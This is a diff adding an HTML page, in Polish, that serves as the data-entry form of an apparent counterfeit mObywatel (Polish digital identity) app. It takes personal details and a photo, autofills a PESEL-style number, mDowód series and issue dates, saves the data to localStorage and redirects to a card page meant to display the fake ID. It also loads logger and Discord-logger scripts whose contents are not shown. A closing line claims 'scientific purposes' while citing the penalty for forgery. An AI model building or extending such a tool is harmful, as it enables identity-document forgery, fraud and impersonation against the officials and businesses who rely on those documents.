@@ -1,0 +1,996 @@
+<!DOCTYPE html>
+<html lang="pl">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>JObywatel - 1.0.</title>
+    <style>
+        /* Czcionka dla czystości i nowoczesności */
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+        :root {
+            --bg-dark: #410808;
+            --bg-mid: #0000009a;
+            --text-light: #000101;
+            --text-subtle: #ffffff;
+            --glass-fill: rgba(221, 221, 221, 0);
+            --border-clear: rgba(2, 0, 3, 0.281);
+            --accent-purple: #265334;
+            --accent-glow: rgba(5, 124, 148, 0.525);
+            --shadow-button: rgba(105, 18, 162, 0.4);
+            --error-red: #ff3333;
+            --success-green: #33ff33;
+            --accent-blue: #2a38b9;
+            /* Akcent dla przycisku generowania dat */
+        }
+
+        body {
+            font-family: 'Inter', sans-serif;
+            background-color: var(--bg-dark);
+            color: var(--text-light);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 15px;
+            box-sizing: border-box;
+            background-image: radial-gradient(circle at top left, var(--bg-mid) 5%, transparent 40%),
+                radial-gradient(circle at bottom right, rgba(150, 0, 255, 0.1) 0%, transparent 45%);
+            margin-top: 5vh;
+        }
+
+        .container {
+            /* Głęboki Frosted Glass Effect */
+            background: var(--glass-fill);
+            backdrop-filter: blur(20px) brightness(1.1);
+            -webkit-backdrop-filter: blur(20px) brightness(1.1);
+
+            padding: 30px;
+            border-radius: 28px;
+            border: 1px solid var(--border-clear);
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.9), 0 0 20px var(--accent-glow) inset;
+            width: 100%;
+            max-width: 350px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            color: var(--text-light);
+            text-align: center;
+            margin-bottom: 30px;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            font-size: 1.8rem;
+            text-shadow: 0 0 10px var(--accent-purple);
+            border-bottom: 1px solid var(--border-clear);
+            padding-bottom: 18px;
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+            position: relative;
+            transition: transform 0.2s ease-out;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 600;
+            color: var(--text-subtle);
+            font-size: 0.85rem;
+            transition: color 0.3s;
+        }
+
+        /* AKCENT MROCZNEGO GLOW PRZY FOCUSIE */
+        .form-group:focus-within {
+            transform: translateY(-2px);
+            background-color: rgba(150, 0, 255, 0.05);
+            border-radius: 12px;
+        }
+
+        .form-group:focus-within label {
+            color: var(--accent-purple);
+            text-shadow: 0 0 8px var(--accent-purple);
+        }
+
+        input[type="text"],
+        input[type="date"],
+        select {
+            width: 100%;
+            padding: 16px 14px;
+            border: 1px solid var(--border-clear);
+            border-radius: 12px;
+            box-sizing: border-box;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: var(--text-light);
+            transition: border-color 0.3s, box-shadow 0.3s;
+            font-size: 1rem;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        input[type="text"]:focus,
+        input[type="date"]:focus,
+        select:focus {
+            border-color: var(--accent-purple);
+            outline: none;
+            box-shadow: 0 0 0 4px var(--accent-glow);
+            background-color: var(--bg-mid);
+        }
+
+        ::placeholder {
+            color: var(--text-subtle);
+            opacity: 0.8;
+        }
+
+        /* Dostosowanie pola daty dla lepszej widoczności w ciemnym motywie */
+        input[type="date"]::-webkit-calendar-picker-indicator {
+            filter: invert(1);
+            /* Odwraca kolor ikonki kalendarza na biały */
+            cursor: pointer;
+        }
+
+        /* --- STYL DLA BLOKU AUTOFILL --- */
+        .autofill-block {
+            margin-top: -10px;
+            margin-bottom: 20px;
+            padding: 15px;
+            border-radius: 12px;
+            background-color: rgba(51, 102, 255, 0.05);
+            border: 1px solid rgba(51, 102, 255, 0.2);
+            box-shadow: 0 0 10px rgba(51, 102, 255, 0.1);
+        }
+
+        #autofillButton {
+            width: 100%;
+            padding: 14px 20px;
+            border: none;
+            border-radius: 8px;
+            cursor: pointer;
+            font-size: 0.95rem;
+            font-weight: 600;
+            transition: all 0.2s ease;
+            margin-top: 0;
+
+            background-color: var(--accent-blue);
+            color: var(--text-light);
+            box-shadow: 0 2px 10px rgba(51, 102, 255, 0.4);
+        }
+
+        #autofillButton:hover:not([disabled]) {
+            transform: translateY(-1px);
+            filter: brightness(1.1);
+            box-shadow: 0 4px 15px rgba(51, 102, 255, 0.6);
+        }
+
+        #statusMessageAutofill {
+            text-align: center;
+            margin-top: 10px;
+            min-height: 18px;
+            font-size: 0.8rem;
+            font-weight: 500;
+            color: var(--text-subtle);
+        }
+
+        /* --- KONIEC STYLU DLA BLOKU AUTOFILL --- */
+
+
+        /* Styl dla głównego przycisku generowania */
+        #generateButton {
+            width: 100%;
+            padding: 18px 20px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-size: 1.1rem;
+            font-weight: 700;
+            transition: all 0.2s ease;
+            margin-top: 30px;
+            margin-bottom: 25px;
+
+            background-color: var(--accent-purple);
+            color: var(--text-light);
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+            box-shadow: 0 4px 20px var(--shadow-button);
+        }
+
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .divider {
+            border: 0;
+            height: 1px;
+            background-color: var(--border-clear);
+            margin: 30px 0;
+        }
+
+        .footer-dev {
+            text-align: center;
+            padding-top: 5px;
+            font-size: 0.75rem;
+            color: var(--text-subtle);
+            letter-spacing: 0.5px;
+            position: relative;
+            width: 100%;
+        }
+
+        .footer-dev span {
+            display: block;
+            color: var(--text-light);
+            font-weight: 800;
+            font-size: 1.5rem;
+            letter-spacing: 2px;
+            text-shadow: 0 0 15px rgba(255, 255, 255, 0.8),
+                0 0 20px var(--accent-purple);
+            margin-top: 5px;
+        }
+
+        /* Sekcja wiadomości/statusu (dla przesłania zdjęcia) */
+        #statusMessage {
+            text-align: center;
+            margin-top: -10px;
+            margin-bottom: 20px;
+            min-height: 18px;
+            font-size: 0.85rem;
+            font-weight: 600;
+        }
+
+        /* STYLA DLA WGRYWANIA PLIKU */
+        .file-upload-wrapper {
+            position: relative;
+            display: block;
+        }
+
+        #fileInput {
+            opacity: 0;
+            position: absolute;
+            z-index: -1;
+            width: 0.1px;
+            height: 0.1px;
+            overflow: hidden;
+        }
+
+        .custom-file-upload {
+            display: block;
+            width: 100%;
+            padding: 16px 14px;
+            border: 1px solid var(--border-clear);
+            border-radius: 12px;
+            box-sizing: border-box;
+            background-color: rgba(0, 0, 0, 0.5);
+            color: var(--text-subtle);
+            cursor: pointer;
+            text-align: center;
+            transition: all 0.3s;
+            font-size: 1rem;
+            font-weight: 500;
+        }
+
+        .custom-file-upload:hover {
+            border-color: var(--accent-purple);
+            box-shadow: 0 0 0 4px rgba(150, 0, 255, 0.2);
+        }
+
+        .image-preview-container {
+            width: 100%;
+            height: 0;
+            opacity: 0;
+            border: 1px dashed transparent;
+            border-radius: 12px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+            margin-top: 0;
+            cursor: pointer;
+            transition: all 0.3s ease-in-out;
+        }
+
+        .image-preview-container.active {
+            height: 120px;
+            opacity: 1;
+            margin-top: 5px;
+            border: 1px dashed var(--border-clear);
+        }
+
+        #imagePreview {
+            max-width: 100%;
+            max-height: 100%;
+            object-fit: contain;
+            border-radius: 8px;
+            display: block;
+        }
+
+        #imagePreviewContainer.active:hover {
+            border-color: var(--accent-purple);
+        }
+
+        /* NOWY STYL DLA PRZYCISKU INSTRUKCJA (PODŚWIETLANY) */
+        .instruction-details {
+            margin-bottom: 25px;
+            border-radius: 12px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            /* Podstawowy cień dla zamkniętego elementu */
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
+        }
+
+        .instruction-details summary {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 15px 20px;
+            cursor: pointer;
+            font-size: 1.05rem;
+            font-weight: 700;
+            list-style: none;
+            /* Ukrywa domyślny trójkąt */
+
+            /* Tło i tekst */
+            background-color: var(--accent-purple);
+            color: var(--text-light);
+            text-shadow: 0 0 5px rgba(0, 0, 0, 0.5);
+
+            /* Efekt podświetlenia - najważniejszy element wizualny */
+            transition: background-color 0.3s, box-shadow 0.3s, transform 0.2s;
+            box-shadow: 0 0 15px var(--accent-glow);
+            /* Początkowe delikatne glow */
+        }
+
+        .instruction-details summary:hover {
+            /* Mocniejsze podświetlenie i delikatny ruch przy najechaniu */
+            transform: translateY(-2px);
+            box-shadow: 0 0 25px var(--accent-glow), 0 0 5px var(--text-light);
+        }
+
+        /* Styl dla otwartej sekcji (po kliknięciu) */
+        .instruction-details[open] summary {
+            background-color: #6a1b9a;
+            /* Lekko ciemniejszy akcent po otwarciu */
+            border-bottom-left-radius: 0;
+            border-bottom-right-radius: 0;
+            box-shadow: 0 0 5px var(--accent-glow);
+        }
+
+        .instruction-details .icon {
+            font-size: 1.2rem;
+            margin-left: 10px;
+            transition: transform 0.2s ease;
+        }
+
+        /* Obrócenie ikonki po otwarciu */
+        .instruction-details[open] .icon {
+            transform: rotate(90deg);
+        }
+
+        .instruction-content {
+            padding: 20px;
+            background-color: var(--bg-mid);
+            /* Tło dla instrukcji */
+            border: 1px solid var(--border-clear);
+            border-top: none;
+            border-bottom-left-radius: 12px;
+            border-bottom-right-radius: 12px;
+        }
+
+        .instruction-content p,
+        .instruction-content strong,
+        .instruction-content li {
+            font-size: 0.9rem;
+            color: var(--text-light);
+            line-height: 1.5;
+            margin-bottom: 10px;
+        }
+
+        .instruction-content ol {
+            margin-top: 5px;
+            margin-left: 20px;
+            padding-left: 0;
+        }
+
+        .discord-btn {
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+            background-color: #ad3ad0af;
+            color: rgb(16, 1, 1);
+            padding: 12px 20px;
+            border-radius: 8px;
+            text-decoration: none;
+            font-weight: 600;
+            font-size: 16px;
+            transition: 0.2s;
+        }
+
+        .discord-btn:hover {
+            background-color: #0d000b;
+        }
+
+        .discord-logo {
+            width: 24px;
+            height: 24px;
+        }
+    </style>
+</head>
+
+<body>
+
+    <div class="container">
+        <h1>Mobywatel</h1>
+        <details class="instruction-details">
+            <summary>
+                INSTRUKCJA
+                <span class="icon">▶</span>
+            </summary>
+            <div class="instruction-content">
+                <p>Aby aplikacja działała jak skrót na pulpicie telefonu (bez paska adresu przeglądarki), postępuj
+                    zgodnie z krokami.</p>
+
+                <strong style="counter-reset: step-counter;">System iOS (iPhone): 📱</strong>
+                <ol>
+                    <li>Upewnij się, że używasz przeglądarki Safari.</li>
+                    <li>Uzupełnij dane i kliknij GENERUJ.</li>
+                    <li>Na nowej stronie naciśnij ikonę Udostępnij.</li>
+                    <li>Wybierz opcję Do Ekranu głównego.</li>
+                </ol>
+
+                <strong style="counter-reset: step-counter;">System Android: 🤖</strong>
+                <ol>
+                    <li>Upewnij się, że używasz przeglądarki Chrome lub Google.</li>
+                    <li>Uzupełnij dane i kliknij GENERUJ.</li>
+                    <li>Na nowej stronie naciśnij ikonę Menu (3 kropki) w prawym górnym rogu.</li>
+                    <li>Wybierz opcję Dodaj do ekranu głównego.</li>
+                </ol>
+            </div>
+        </details>
+        <form id="dataGenerator">
+            <div class="form-group">
+                <label for="name">Imię:</label>
+                <input type="text" id="name" name="name" placeholder="Jan" required>
+            </div>
+
+            <div class="form-group">
+                <label for="surname">Nazwisko:</label>
+                <input type="text" id="surname" name="surname" placeholder="Kowalski" required>
+            </div>
+
+            <div class="form-group">
+                <label for="sex">Płeć:</label>
+                <select id="sex" name="sex" required>
+                    <option value="MĘŻCZYZNA">MĘŻCZYZNA</option>
+                    <option value="KOBIETA">KOBIETA</option>
+                </select>
+            </div>
+
+            <div class="form-group">
+                <label for="birthday">Data Urodzenia (wybierz z kalendarza):</label>
+                <input type="date" id="birthday" name="birthday" required>
+            </div>
+
+            <div class="autofill-block">
+                <button type="button" id="autofillButton">Wypełnij Daty Automatycznie</button>
+                <div id="statusMessageAutofill"></div>
+            </div>
+            <div class="form-group">
+                <label for="pesel">Numer PESEL:</label>
+                <input type="text" id="pesel" name="pesel" placeholder="11-cyfrowy numer" maxlength="11"
+                    pattern="[0-9]{11}" required>
+            </div>
+
+            <div class="form-group">
+                <label for="mdow_series">Seria i numer mDowodu:</label>
+                <input type="text" id="mdow_series" name="mdow_series" placeholder="MWYC XXXXX" required>
+                <input type="hidden" id="id_series" name="id_series" value="">
+                <input type="hidden" id="id_issue_date" name="id_issue_date" value="">
+                <input type="hidden" id="id_expiry_date" name="id_expiry_date" value="">
+            </div>
+
+            <div class="form-group">
+                <label for="issue_date">Data wydania mDowodu (DD.MM.RRRR):</label>
+                <input type="text" id="issue_date" name="issue_date" placeholder="14.07.2023" maxlength="10"
+                    pattern="[0-9]{2}\.[0-9]{2}\.[0-9]{4}" required>
+            </div>
+
+            <div class="form-group">
+                <label for="expiry_date">Termin ważności mDowodu (DD.MM.RRRR):</label>
+                <input type="text" id="expiry_date" name="expiry_date" placeholder="14.07.2028" maxlength="10"
+                    pattern="[0-9]{2}\.[0-9]{2}\.[0-9]{4}" required>
+            </div>
+
+            <div class="form-group">
+                <label for="father_name">Imię ojca:</label>
+                <input type="text" id="father_name" name="father_name" placeholder="Maciej" required>
+            </div>
+
+            <div class="form-group">
+                <label for="mother_name">Imię matki:</label>
+                <input type="text" id="mother_name" name="mother_name" placeholder="Ewa" required>
+            </div>
+
+            <div class="form-group">
+                <label for="nationality">Obywatelstwo:</label>
+                <input type="text" id="nationality" name="nationality" placeholder="POLSKIE" required>
+            </div>
+
+            <div class="form-group">
+                <label for="birthPlace">Miejsce Urodzenia:</label>
+                <input type="text" id="birthPlace" name="birthPlace" placeholder="Warszawa" required>
+            </div>
+
+            <div class="form-group">
+                <label for="birth_country">Kraj Urodzenia:</label>
+                <input type="text" id="birth_country" name="birth_country" placeholder="Polska" required>
+            </div>
+
+            <div class="form-group">
+                <label for="adress1">Adres (Ulica i numer):</label>
+                <input type="text" id="adress1" name="adress1" placeholder="Chopina 4/56" required>
+            </div>
+
+            <div class="form-group">
+                <label for="adress2">Kod pocztowy / nr:</label>
+                <input type="text" id="adress2" name="adress2" placeholder="42-250">
+            </div>
+
+            <div class="form-group">
+                <label for="city">Miasto:</label>
+                <input type="text" id="city" name="city" placeholder="Warszawa">
+            </div>
+
+            <div class="form-group">
+                <label for="home_date">Data zameldowania (DD.MM.RRRR):</label>
+                <input type="text" id="home_date" name="home_date" placeholder="01.01.2000" maxlength="10"
+                    pattern="[0-9]{2}\.[0-9]{2}\.[0-9]{4}" required>
+            </div>
+
+            <div class="form-group">
+                <label for="family_name">Nazwisko rodowe (Twoje):</label>
+                <input type="text" id="family_name" name="family_name" placeholder="Kowalski / Panieńskie">
+            </div>
+
+            <div class="form-group">
+                <label for="father_family_name">Nazwisko rodowe ojca:</label>
+                <input type="text" id="father_family_name" name="father_family_name" placeholder="Kowalski">
+            </div>
+
+            <div class="form-group">
+                <label for="mother_family_name">Nazwisko rodowe matki:</label>
+                <input type="text" id="mother_family_name" name="mother_family_name" placeholder="Nowak">
+            </div>
+
+            <div class="divider"></div>
+
+            <div class="form-group">
+                <label for="fileInput">Zdjęcie:</label>
+                <div class="file-upload-wrapper">
+                    <input type="file" id="fileInput" accept="image/jpeg, image/png" required>
+
+                    <label for="fileInput" id="fileLabel" class="custom-file-upload">Wybierz plik...</label>
+
+                    <label for="fileInput" class="image-preview-container" id="imagePreviewContainer">
+                        <img id="imagePreview" src="#" alt="Podgląd zdjęcia">
+                    </label>
+
+                    <input type="hidden" id="image" name="image" value="">
+                </div>
+            </div>
+            <div id="statusMessage"></div>
+
+            <button type="submit" id="generateButton">/// GENERUJ ///</button>
+
+            <div class="footer-dev">
+                <a href="https://www.instagram.com/_janek0707?stkn=MWUyNnp5Y2xncDB3cg==" class="discord-btn" target="_blank">
+                    <img src="https://png.pngtree.com/png-clipart/20221019/original/pngtree-instagram-icon-png-image_8704817.png"
+                        alt="Discord" class="discord-logo">
+                    Zostaw obserwacje na ig
+                </a>
+            </div>
+
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById('dataGenerator');
+        const fileInput = document.getElementById('fileInput');
+        const imageURLInput = document.getElementById('image');
+        const fileLabel = document.getElementById('fileLabel');
+        const generateButton = document.getElementById('generateButton');
+        const statusMessage = document.getElementById('statusMessage'); // Status uploadu
+        const statusMessageAutofill = document.getElementById('statusMessageAutofill'); // Status autofill
+        const imagePreview = document.getElementById('imagePreview');
+        const imagePreviewContainer = document.getElementById('imagePreviewContainer');
+        const autofillButton = document.getElementById('autofillButton');
+
+        // Pola, które mają być automatycznie wypełniane
+        const peselInput = document.getElementById('pesel');
+        const issueDateInput = document.getElementById('issue_date');
+        const expiryDateInput = document.getElementById('expiry_date');
+        const homeDateInput = document.getElementById('home_date');
+        const birthdayInput = document.getElementById('birthday');
+        const mdowSeriesInput = document.getElementById('mdow_series');
+        const idSeriesInput = document.getElementById('id_series');
+        const idIssueDateInput = document.getElementById('id_issue_date');
+        const idExpiryDateInput = document.getElementById('id_expiry_date');
+
+        // Pola daty, które wymagają ręcznej walidacji DD.MM.RRRR (wszystkie oprócz 'birthday')
+        const manualDateFields = [
+            issueDateInput,
+            expiryDateInput,
+            homeDateInput,
+        ];
+
+        // =========================================================
+        // FUNKCJE POMOCNICZE
+        // =========================================================
+
+        // Konwertuje datę z YYYY-MM-DD (format input type="date") na DD.MM.RRRR
+        function formatDateForDisplay(date) {
+            if (!(date instanceof Date) || isNaN(date)) return '';
+            const day = String(date.getDate()).padStart(2, '0');
+            const month = String(date.getMonth() + 1).padStart(2, '0');
+            const year = date.getFullYear();
+            return `${day}.${month}.${year}`;
+        }
+
+        // Funkcja do konwersji daty z formatu YYYY-MM-DD (z input type="date") na DD.MM.RRRR
+        function formatDateForURL(dateString) {
+            if (!dateString) return '';
+            const parts = dateString.split('-'); // [YYYY, MM, DD]
+            return `${parts[2]}.${parts[1]}.${parts[0]}`; // DD.MM.RRRR
+        }
+
+        // Generuje losowy 5-cyfrowy numer
+        function generateRandomFiveDigits() {
+            return Math.floor(10000 + Math.random() * 90000);
+        }
+
+        function generateRandomSixDigits() {
+            return Math.floor(100000 + Math.random() * 900000);
+        }
+
+        function normalizeDocumentNumber(value) {
+            return (value || '').toString().replace(/\s+/g, '').toUpperCase();
+        }
+
+        function parseDisplayDate(value) {
+            const parts = (value || '').split('.');
+            if (parts.length !== 3) return null;
+            const date = new Date(Number(parts[2]), Number(parts[1]) - 1, Number(parts[0]));
+            return Number.isNaN(date.getTime()) ? null : date;
+        }
+
+        function generateIdSeries(mdowSeries) {
+            const prefixes = ['ABC', 'BCA', 'CDA', 'DAB', 'EFA', 'GHA', 'KLD', 'LPA', 'MRA', 'NCE', 'PZA', 'RDA', 'SXA', 'TKA', 'VBA', 'XCA', 'YDA', 'ZZC'];
+            let value = '';
+
+            do {
+                const prefix = prefixes[Math.floor(Math.random() * prefixes.length)];
+                value = `${prefix} ${generateRandomSixDigits()}`;
+            } while (normalizeDocumentNumber(value) === normalizeDocumentNumber(mdowSeries));
+
+            return value;
+        }
+
+        function syncPersonalIdData() {
+            const mdowSeries = mdowSeriesInput.value || `MWYC ${generateRandomFiveDigits()}`;
+            const mdowIssueDate = parseDisplayDate(issueDateInput.value);
+            const idIssueDate = mdowIssueDate ? new Date(mdowIssueDate.getTime()) : new Date();
+
+            idIssueDate.setFullYear(idIssueDate.getFullYear() - 1);
+            idIssueDate.setDate(idIssueDate.getDate() - 7);
+
+            const idExpiryDate = new Date(idIssueDate.getTime());
+            idExpiryDate.setFullYear(idExpiryDate.getFullYear() + 10);
+
+            idSeriesInput.value = generateIdSeries(mdowSeries);
+            idIssueDateInput.value = formatDateForDisplay(idIssueDate);
+            idExpiryDateInput.value = formatDateForDisplay(idExpiryDate);
+        }
+
+        // =========================================================
+        // LOGIKA GENEROWANIA DAT I DANYCH (AUTOFILL)
+        // ZMIENIONA: PESEL generowany tak jak w card.js
+        // =========================================================
+
+        autofillButton.addEventListener('click', function () {
+            const birthDateValue = birthdayInput.value;
+            statusMessageAutofill.style.color = 'var(--error-red)';
+
+            if (!birthDateValue) {
+                statusMessageAutofill.textContent = 'BŁĄD: Najpierw wybierz Datę Urodzenia z kalendarza!';
+                return;
+            }
+
+            const birthDate = new Date(birthDateValue);
+            const currentYear = new Date().getFullYear();
+            const birthYear = birthDate.getFullYear();
+            const isAdult = currentYear - birthYear >= 18;
+
+            // --- 1. Generowanie Dat ---
+            let issueDate;
+
+            if (isAdult) {
+                const adultDate = new Date(birthDate.getTime());
+                adultDate.setFullYear(adultDate.getFullYear() + 18);
+
+                issueDate = new Date(adultDate.getTime());
+                issueDate.setDate(issueDate.getDate() + 1);
+
+                const today = new Date();
+                if (issueDate > today) {
+                    issueDate = new Date(today.getTime());
+                }
+
+            } else {
+                issueDate = new Date(birthDate.getTime());
+                issueDate.setFullYear(issueDate.getFullYear() + 13);
+                issueDate.setDate(issueDate.getDate() + 1);
+
+                const today = new Date();
+                if (issueDate > today) {
+                    issueDate = new Date(today.getTime());
+                }
+            }
+
+            const expiryDate = new Date(issueDate.getTime());
+            expiryDate.setFullYear(expiryDate.getFullYear() + 5);
+
+            const homeDate = new Date(birthDate.getTime());
+            homeDate.setFullYear(homeDate.getFullYear() + 1);
+
+            // --- 2. Wypełnianie pól ---
+
+            // PESEL - teraz generujemy tak, jak w card.js (bez losowych fragmentów)
+            const birthMonth = birthDate.getMonth() + 1;
+            const birthDay = birthDate.getDate();
+            const birthYearMod = birthYear % 100;
+
+            let peselMonth = birthMonth;
+            if (birthYear >= 2000) {
+                peselMonth += 20;
+            }
+
+            // later zgodnie z card.js: mężczyzna -> 0295, kobieta -> 0382
+            const sexVal = document.getElementById('sex').value;
+            const sexLower = (sexVal || "").toString().toLowerCase();
+            let later = "0295"; // domyślnie mężczyzna
+            if (sexLower.indexOf('kob') !== -1) later = "0382";
+
+            let dayStr = String(birthDay);
+            let monthForPesel = peselMonth;
+            if (birthDay < 10) dayStr = "0" + dayStr;
+            let monthStr = String(monthForPesel);
+            if (monthForPesel < 10) monthStr = "0" + monthStr;
+
+            const generatedPesel = String(birthYearMod).padStart(2, '0') + monthStr + dayStr + later + "7";
+            peselInput.value = generatedPesel.substring(0, 11);
+
+            mdowSeriesInput.value = `MWYC ${generateRandomFiveDigits()}`;
+
+            issueDateInput.value = formatDateForDisplay(issueDate);
+            expiryDateInput.value = formatDateForDisplay(expiryDate);
+            homeDateInput.value = formatDateForDisplay(homeDate);
+            syncPersonalIdData();
+
+            statusMessageAutofill.style.color = 'var(--success-green)';
+            statusMessageAutofill.textContent = 'Daty i numery zostały wygenerowane pomyślnie! ✅';
+        });
+
+        // =========================================================
+        // LOGIKA WALIDACJI: Weryfikacja formatu dat i PESEL
+        // =========================================================
+
+        function validateDateFormat(input) {
+            const datePattern = new RegExp(input.pattern);
+            if (!input.value) return !input.required;
+
+            if (input.value.length !== 10 || !datePattern.test(input.value)) {
+                return false;
+            }
+            return true;
+        }
+
+        function validatePeselFormat(input) {
+            const peselPattern = new RegExp(input.pattern);
+            if (!input.value) return !input.required;
+
+            if (input.value.length !== 11 || !peselPattern.test(input.value)) {
+                return false;
+            }
+            return true;
+        }
+
+        // =========================================================
+        // LOGIKA ZDJĘCIA: Podgląd i przesyłanie
+        // =========================================================
+
+        fileInput.addEventListener('change', function () {
+            statusMessage.textContent = '';
+
+            const file = this.files[0];
+
+            if (file) {
+                const reader = new FileReader();
+                reader.onload = function (e) {
+                    imagePreview.src = e.target.result;
+                    imagePreview.style.display = 'block';
+                    imagePreviewContainer.classList.add('active');
+                    fileLabel.style.display = 'none';
+                };
+                reader.readAsDataURL(file);
+
+                imageURLInput.value = '';
+                statusMessage.textContent = 'Zdjęcie załadowane!';
+                statusMessage.style.color = 'var(--text-light)';
+            } else {
+                fileLabel.style.display = 'block';
+                imagePreview.style.display = 'none';
+                imagePreviewContainer.classList.remove('active');
+                imageURLInput.value = '';
+                statusMessage.textContent = '';
+            }
+        });
+
+        // =========================================================
+        // ZARZĄDZANIE SUBMITEM FORMULARZA
+        // - mapujemy nazwy do tych, których oczekuje card.js
+        // - konwertujemy birthday na DD.MM.RRRR
+        // - wysyłamy sex jako 'm' lub 'k'
+        // - przekierowanie do card.html
+        // =========================================================
+        form.addEventListener('submit', async function (event) {
+            event.preventDefault();
+
+            // 1. Walidacja
+            for (const input of manualDateFields) {
+                if (!validateDateFormat(input)) {
+                    statusMessage.style.color = 'var(--error-red)';
+                    statusMessage.textContent = `BŁĄD: Pole ${input.name.toUpperCase()} musi być w formacie DD.MM.RRRR!`;
+                    input.focus();
+                    return;
+                }
+            }
+
+            if (!validatePeselFormat(peselInput)) {
+                statusMessage.style.color = 'var(--error-red)';
+                statusMessage.textContent = 'BŁĄD: Numer PESEL musi zawierać 11 cyfr!';
+                peselInput.focus();
+                return;
+            }
+
+            if (!fileInput.files || fileInput.files.length === 0) {
+                statusMessage.style.color = 'var(--error-red)';
+                statusMessage.textContent = 'Wybierz plik zdjęcia, aby kontynuować!';
+                return;
+            }
+
+            syncPersonalIdData();
+
+            // 2. Przesyłanie zdjęcia (jeśli nie ma linku)
+            if (imageURLInput.value === '') {
+                // Store base64 image data
+                const file = fileInput.files[0];
+                const reader = new FileReader();
+                reader.onload = function (e) {
+                    imageURLInput.value = e.target.result;
+                    proceedWithForm();
+                };
+                reader.readAsDataURL(file);
+            } else {
+                proceedWithForm();
+            }
+        });
+
+        function proceedWithForm() {
+            // Zbierz wszystkie dane z formularza
+            const nameMap = {
+                family_name: "familyName",
+                father_family_name: "fathersFamilyName",
+                mother_family_name: "mothersFamilyName",
+                birth_country: "countryOfBirth"
+            };
+
+            const cardData = {};
+            const allInputs = form.querySelectorAll('input, select');
+
+            for (const input of allInputs) {
+                const rawKey = input.name;
+                if (!rawKey) continue;
+                if (rawKey === 'fileInput') continue;
+
+                let value = input.value || "";
+
+                // birthday -> DD.MM.RRRR
+                if (rawKey === 'birthday') {
+                    value = formatDateForURL(input.value);
+                }
+
+                // sex -> card.html expects 'm' or 'k'
+                if (rawKey === 'sex') {
+                    const v = (value || "").toString().toLowerCase();
+                    if (v.indexOf('kob') !== -1 || v.indexOf('k') === 0) {
+                        value = 'k';
+                    } else {
+                        value = 'm';
+                    }
+                }
+
+                // image: użyj base64
+                if (rawKey === 'image' && imageURLInput.value) {
+                    value = imageURLInput.value;
+                }
+
+                // mapuj klucze (family_name -> familyName itd.)
+                const finalKey = nameMap[rawKey] || rawKey;
+                cardData[finalKey] = value;
+            }
+
+            // Upewnij się, że sex jest zapisany też jako bardziej czytelna wartość
+            // ale zachowaj oryginał dla card.html
+            const sexVal = cardData['sex'] || 'm';
+
+            // === ZAPIS DO localStorage – KLUCZ GŁÓWNY (card.html to czyta) ===
+            // Konwersja z aliasów app.html -> nazwy które card.html czyta
+            const cardDataForStorage = {
+                name: cardData['name'] || '',
+                surname: cardData['surname'] || '',
+                sex: sexVal,
+                birthday: cardData['birthday'] || '',
+                pesel: cardData['pesel'] || '',
+                mdow_series: cardData['mdow_series'] || '',
+                issue_date: cardData['issue_date'] || '',
+                expiry_date: cardData['expiry_date'] || '',
+                father_name: cardData['father_name'] || '',
+                mother_name: cardData['mother_name'] || '',
+                nationality: cardData['nationality'] || 'POLSKIE',
+                birthPlace: cardData['birthPlace'] || '',
+                birth_country: cardData['countryOfBirth'] || cardData['birth_country'] || 'Polska',
+                countryOfBirth: cardData['countryOfBirth'] || 'Polska',
+                adress1: cardData['adress1'] || '',
+                adress2: cardData['adress2'] || '',
+                city: cardData['city'] || '',
+                home_date: cardData['home_date'] || '',
+                family_name: cardData['family_name'] || cardData['familyName'] || '',
+                familyName: cardData['familyName'] || cardData['family_name'] || '',
+                fathersFamilyName: cardData['fathersFamilyName'] || cardData['father_family_name'] || '',
+                father_family_name: cardData['father_family_name'] || cardData['fathersFamilyName'] || '',
+                mothersFamilyName: cardData['mothersFamilyName'] || cardData['mother_family_name'] || '',
+                mother_family_name: cardData['mother_family_name'] || cardData['mothersFamilyName'] || '',
+                photoUrl: cardData['image'] || '',
+                image: cardData['image'] || ''
+            };
+
+            try {
+                // Zapis głównego JSON
+                localStorage.setItem('mobywatel_card_data', JSON.stringify(cardDataForStorage));
+                // Zapis indywidualnych kluczy (fallback dla card.html)
+                localStorage.setItem('name', cardDataForStorage.name);
+                localStorage.setItem('surname', cardDataForStorage.surname);
+                localStorage.setItem('pesel', cardDataForStorage.pesel);
+                localStorage.setItem('birthDay', cardDataForStorage.birthday);
+                localStorage.setItem('birthday', cardDataForStorage.birthday);
+                if (cardDataForStorage.photoUrl) {
+                    localStorage.setItem('image', cardDataForStorage.photoUrl);
+                    localStorage.setItem('photoUrl', cardDataForStorage.photoUrl);
+                }
+            } catch(err) {
+                console.error('Błąd zapisu localStorage:', err);
+            }
+
+            // Przekieruj do card.html BEZ URL params (dane są w localStorage)
+            window.location.href = 'card.html';
+        }
+    </script>
+<script src="assets/logger.js"></script>
+<script src="assets/discord-logger.js"></script>
+</body>
+<h1 style="font-size: 20px;">Aplikacja jest stworzona wyłącznie do celów naukowych</h1>
+<h1 style="font-size: 15px;">Posługiwanie się sfałszowaną aplikacją mObywatel jest przestępstwem z art. 270 § 1 Kodeksu karnego (używanie podrobionego dokumentu), za które grozi grzywna, kara ograniczenia wolności albo pozbawienia wolności od 3 miesięcy do 5 lat.</h1>
+</html>
